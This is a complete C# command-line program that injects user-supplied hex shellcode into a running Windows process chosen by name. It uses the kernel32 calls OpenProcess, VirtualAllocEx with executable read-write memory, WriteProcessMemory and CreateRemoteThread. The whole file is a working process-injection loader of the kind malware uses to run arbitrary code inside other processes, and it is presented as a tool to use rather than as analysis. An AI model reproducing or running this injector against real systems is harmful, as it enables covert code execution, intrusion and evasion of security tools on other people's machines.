using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        int dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParametr,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;

    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main ()
    {
        try
        {
            Console.Write("Enter the process name (Write without the .exe extension): ");
            string processname = Console.ReadLine();

            Console.Write("Enter your shell code (check README.md): ");

            string input = Console.ReadLine().Replace(" ", "").Replace("\n", "").Replace("\r", "");
            byte[] shellcode;

            try
            {
                shellcode = Convert.FromHexString(input);
            }
            catch
            {
                Console.WriteLine("[!] Invalid HEX. Exiting....");
                return;
            }

            Process[] procs = Process.GetProcessesByName(processname);
            if (procs.Length == 0)
            {
                Console.WriteLine("[!] Process is NOT running. Exiting....");
                return;
            }

            Process userprocess = procs[0];
            uint pid = (uint)userprocess.Id;

            int bytesWritten;

            IntPtr hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] Insufficient rights. Run as administrator. Exiting....");
                return;
            }

            IntPtr AllocatedEx = VirtualAllocEx(hProcess, 0, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (AllocatedEx == IntPtr.Zero)
            {
                Console.WriteLine("[!] VirtualAllocEx Failed");
                CloseHandle(hProcess);
                return;
            }
            bool success = WriteProcessMemory(hProcess, AllocatedEx, shellcode, shellcode.Length, out bytesWritten);

            uint threadId;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, AllocatedEx, IntPtr.Zero, 0, out threadId);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine($"[!] CreateRemoteThread failed: {Marshal.GetLastWin32Error()}");
                CloseHandle(hProcess);
                return;
            }

            if (success)
            {
                Console.WriteLine("Success!");
                Console.WriteLine($"Written: {bytesWritten} bytes");
            }
            else
            {
                Console.WriteLine("[!] WriteProcessMemory failed.");
                CloseHandle(hProcess);
                CloseHandle(hThread);
                return;
            }

            CloseHandle(hProcess);
            CloseHandle(hThread);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An unknown error has occurred: {ex}");
        }

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}